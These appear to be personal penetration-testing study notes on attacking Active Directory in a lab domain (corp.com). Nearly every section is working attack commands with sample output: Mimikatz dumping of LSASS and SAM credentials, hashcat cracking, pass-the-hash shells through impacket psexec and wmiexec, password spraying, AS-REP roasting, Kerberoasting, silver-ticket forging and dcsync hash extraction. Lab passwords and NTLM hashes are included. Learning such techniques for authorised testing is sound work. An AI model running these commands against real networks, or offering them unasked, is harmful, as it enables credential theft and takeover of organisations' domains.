# Active Directory Exploitation

Having enumerated user accounts, group memberships, and registered Service Principal Names let's now attempt to use this information to compromise Active Directory.



Start PowerShell as an administrator:
- Windows Run Box: `powershell -Command "Start-Process powershell -Verb RunAs"`
- Executable: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- File Explorer: right-click anywhere in the folder and select "Open in Terminal"
- Shortcut: `Win+X` to open context menu and then `a` (Terminal Admin)


















In Domain Controller:`C:\Windows\NTDS\ntds.dit` (New Technology Directory Services Directory Information Tree)





## Cached AD Credentials

Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request.
In modern versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space.

If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions.

Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.






### Mimikatz
Mimikatz is a hacking tool that extracts Windows authentication credentials from memory, including passwords and hashes. It can then use these credentials to gain unauthorized access, escalate privileges, and perform further attacks.\

- <https://github.com/gentilkiwi/mimikatz/wiki/>
- <https://github.com/ParrotSec/mimikatz>
- <https://adsecurity.org/?page_id=1821>


- Use Mimikatz to extract domain hashes on our Windows 11 system
```
# SeDebugPrivlege privilege allow us to interact with a process owned by another account
privilege::debug

# Dump the credentials of all logged-on users with the Sekurlsa module
# sekurlsa::logonpasswords attempts to extract plaintext passwords and password hashes from all available sources (generates a huge amount of output)
# This should dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions
sekurlsa::logonpasswords


# show the tickets that are stored in memory
# previously open a second PowerShell window and do something to create a  cache a service ticket. Example: dir \\web04.corp.com\backup
sekurlsa::tickets

```

TGS would allow us to access only particular resources associated with those tickets

Alternatively, with a TGT we could request a TGS for specific resources we want to target within the domain. 



- export certificate with the private key
The `crypto` module contains the capability to either patch the `CryptoAPI` function with `crypto::capi` or `KeyIso` service with `crypto::cng` making non-exportable keys exportable.




















## Password Attacks

Beware of account lockouts! To learn about this use the `net accounts` command.
```
...
Lockout threshold:
Lockout duration (minutes):
Lockout observation window (minutes):
...
```






### Cracking NTLM (Local)

Use Mimikatz to obtain NTLM hashes and follow the cracking methodology to crack the hash.


`lsadump::sam` will extract the NTLM hashes from the SAM.

For this command, we must first enter `token::elevate` to elevate to SYSTEM user privileges.

Also we must have the `SeDebugPrivilege` access right enabled, which we'll accomplish with `privilege::debug`.

```
privilege::debug
token::elevate
lsadump::sam
```




```
hashcat --help | grep -i "ntlm"
```



```
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```








### Passing NTLM (Local)

Leverage an NTLM hash without cracking it.

We can PtH technique to authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password.
This is possible because NTLM/LM password hashes are not salted and remain static between sessions.
Moreover, if we discover a password hash on one target, we can use it to not only authenticate to that target, but to another target as well, as long as the second target has an account with the same username and password.

To leverage this into code execution of any kind, the account also needs administrative privileges on the second target.



#### Tools
To leverage pass-the-hash (PtH), we need tools that support authentication with NTLM hashes.

Fortunately for us, we have many to choose from.

- For SMB enumeration and management, we can use `smbclient` or `CrackMapExec`.
```
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

- For command execution, we can use the scripts from the `impacket` library like `psexec.py` and `wmiexec.py`.

To execute `psexec`, we can enter `impacket-psexec` with two arguments.
The first argument is `-hashes`, which allows us to use NTLM hashes to authenticate to the target. The format is "LMHash:NTHash", in which we specify the Administrator NTLM hash after the colon. Since we only use the NTLM hash, we can fill the LMHash section with 32 0's.

The second argument is the target definition in the format "username@ip".

At the end of the command we could specify another argument, which is used to determine which command psexec should execute on the target system. If we leave it empty, `cmd.exe` will be executed, providing us with an interactive shell.

Due to the nature of `psexec.py`, we'll always receive a shell as `SYSTEM` instead of the user we used to authenticate.

```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212


C:\Windows\system32> whoami
nt authority\system

```

We can also use one of the other impacket scripts like `wmiexec.py` to obtain a shell as the user we used for authentication. On Kali, we would use `impacket-wmiexec` along with the arguments we used for `impacket-psexec`.
```
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212


C:\>whoami
files02\administrator
```
As the whoami output shows, we obtained a shell as the Administrator user with wmiexec instead of SYSTEM.






- We can also use NTLM hashes to not only connect to target systems with SMB, but also via other protocols like RDP and WinRM, if the user has the required rights.

- We can also use Mimikatz to conduct pass-the-hash as well.















### Cracking Net-NTLMv2 (Local)

If we have no privileges, we can abuse the `Net-NTLMv2` network authentication protocol.

seguir 15.3.3




### Relaying Net-NTLMv2
ver 15.3.4









### Using DAP and ADSI
- perform a low and slow password attack against AD users
- make queries in the context of a different user by setting the DirectoryEntry instance
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

If the password for the user account is correct, the object creation will be successful.
If the password is invalid, no object will be created and we will receive an exception.



This password spraying tactic is already implemented in the PowerShell script `Spray-Passwords.ps1`

```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```









### Using SMB
For every authentication attempt, a full SMB connection has to be set up and then terminated. As a result, this kind of password attack is very noisy due to the generated network traffic. It is also quite slow in comparison to other techniques.  

```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```


If the user with the identified credentials has administrative privileges crackmapexec adds `Pwn3d!` to the output. In an assessment, this is an excellent feature to determine the level of access we have without performing additional enumeration.






### Using Kerberos TGT

- <https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html>
- <https://github.com/ropnop/kerbrute>


```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
(make sure that the encoding of usernames.txt is ANSI!)

Get-Content "input.txt" | Out-File "output.txt" -Encoding ASCII





















## AS-REP Roasting
Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response.

By default, the AD user account option Do not require Kerberos preauthentication is disabled, meaning that Kerberos preauthentication is performed for all users. However, it is possible to enable this account option manually.

In assessments, we may find accounts with this option enabled as some applications and technologies require it to function properly.



### Linux
Use `Impacket`


```
# Just list users with "Do not require Kerberos preauthentication" enabled
impacket-GetNPUsers -dc-ip [DOMAIN CONTROLLER IP] corp.com/pete

# get the hash
impacket-GetNPUsers -dc-ip [DOMAIN CONTROLLER IP] -request -outputfile [OUTPUT FILE NAME] corp.com/pete
```

This will show the user account option "Do not require Kerberos preauthentication" enabled, meaning it's vulnerable to AS-REP Roasting.


By default, the resulting hash format of impacket-GetNPUsers is compatible with Hashcat. Therefore, let's check the correct mode for the AS-REP hash by grepping for "Kerberos" in the Hashcat help.

```
hashcat --help | grep -i "Kerberos"
19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
7500  | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```


```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```



### Windows
Use `Rubeus.exe`.

- <https://github.com/GhostPack/Rubeus>


Since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except asreproast. Rubeus will automatically identify vulnerable user accounts. We also add the flag /nowrap to prevent new lines being added to the resulting AS-REP hashes.

```
.\Rubeus.exe asreproast /nowrap
```

Then copy the hash and use `hashcat`








### Targeted AS-REP Roasting
If we have `GenericWrite` or `GenericAll` permissions on another AD user account we could reset their passwords, but this would lock out the user from accessing the account.

We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication.

Notably, we should reset the User Account Control value of the user once we've obtained the hash.





















## Kerberoasting
Involves extracting a hash of the encrypted material from a Kerberos "Ticket Granting Service" ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password.



### Windows
Use `Rubeus.exe`.


```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```



Then hashcat

```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```











### Linux
Use `impacket-GetUserSPNs` with the IP of the domain controller as the argument for `-dc-ip`.
Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash.
As before, we can use `-request` to obtain the TGS and output them in a compatible format for Hashcat.


```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

NOTE: if `impacket-GetUserSPNs` throws the error "KRB_AP_ERR_SKEW(Clock skew too great)" we need to synchronize the time of the Kali machine with the domain controller with `ntpdate` or `rdate`.























## Silver Ticket
Forge a TGS ticket to access a SPECIFIC SERVICE.

Is a custom-created ticket and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account only checks the user's permissions from the group memberships included in the service ticket.

However, the user and group permissions in the service ticket are not verified by the application in a majority of environments.

In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.

Privileged Account Certificate (PAC) validation is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller.

Fortunately for this attack technique, service applications rarely perform PAC validation.

In general, we need to collect the following three pieces of information to create a silver ticket:

1. SPN password hash
Mimikatz:
```
privilege::debug
sekurlsa::logonpasswords

```


2. Domain SID
[PREFIX][DOMAIN SID][RID]
Example:
```
whoami /user
# output: corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
# Domain SID: S-1-5-21-1987370270-658905905-1781884369
```



3. Target SPN
Example:
the HTTP SPN resource on WEB04 (HTTP/web04.corp.com:80)





With the 3 pieces of information we can build the command to create the silver ticket.




The `kerberos::golden` module provides the capabilities for creating golden and silver tickets.

We need to provide the domain SID (/sid:), domain name (/domain:), and the target where the SPN runs (/target:). We also need to include the SPN protocol (/service:), NTLM hash of the SPN (/rc4:), and the /ptt option, which allows us to inject the forged ticket into the memory of the machine we execute the command on.

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```


Now we should have the ticket ready to use in memory.
We can confirm this with `klist`.



This attack is performed without access to the plaintext password or password hash of this user.

Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.



Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.
With this patch in place, the extended PAC structure field `PAC_REQUESTOR` needs to be validated by a domain controller.
This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain.
Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.























## Domain Controller Synchronization / dcsync attack


In production environments, domains typically rely on more than one domain controller to provide redundancy. The Directory Replication Service (DRS) Remote Protocol1 uses replication to synchronize these redundant domain controllers.

A domain controller may request an update for a specific object, like an account, using the `IDL_DRSGetNCChange`s API.

Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.

To launch such a replication, a user needs to have the `Replicating Directory Changes`, `Replicating Directory Changes All`, and `Replicating Directory Changes` in Filtered Set rights.

By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.



If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.



### Windows
Use Mimikatz on a domain-joined Windows machine

We can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator Administrator.

```
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator

# Output
...
Credentials:
    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
...
```


Then user hashcat:
```
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```





### Linux
impacket-secretsdump on our non-domain joined Kali machine

```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.166.70


# Output
...
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
# This is the hash: 08d7a47a6f9f66b97b1bae4178747494
...
```


























